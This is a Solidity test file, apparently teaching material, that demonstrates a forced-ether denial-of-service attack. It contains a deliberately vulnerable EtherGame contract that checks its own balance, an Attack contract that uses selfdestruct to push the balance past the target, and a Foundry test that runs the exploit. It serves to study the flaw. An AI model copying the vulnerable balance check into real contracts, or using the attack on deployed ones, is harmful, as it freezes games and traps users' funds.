// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/


contract EtherGame {
    uint constant public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;   // vulnerable
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}


contract ContractTest is Test {
    EtherGame EtherGameContract;
    Attack AttackerContract;
    address alice;
    address eve;

    function setUp() public {
        EtherGameContract = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);   
        vm.deal(address(eve), 1 ether); 
    }

    function testFailSelfdestruct() public {
        console.log("Alice balance", alice.balance);
        console.log("Eve balance", eve.balance);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);    
        EtherGameContract.deposit{value: 1 ether}();

        console.log("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameContract.deposit{value: 1 ether}();

        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);

        console.log("Attack...");
        AttackerContract = new Attack(EtherGameContract);
        AttackerContract.dos{value: 5 ether}();

        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
        console.log("Exploit completed, Game is over");
        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
    }
}



contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}